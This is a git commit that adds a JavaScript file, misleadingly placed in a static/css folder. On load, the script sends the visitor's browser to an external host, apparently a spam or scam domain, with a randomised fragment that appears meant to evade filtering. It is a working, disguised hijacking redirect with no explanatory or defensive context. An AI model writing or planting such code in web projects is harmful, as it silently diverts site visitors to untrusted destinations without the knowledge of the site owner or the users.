76f2c25e9826c8cb6bdae887d1b9617869ee37de
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-26 00:05:38 +0800

    Create mt8.js

---
+++ static/css/mt8.js
@@ -0,0 +1,15 @@
+var urls=[' http://pbwci.qun.hk./Fl-1nhLr7F_1MZtrk1o7u38TKE9G#{nnnnnnn}{wwww}',];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
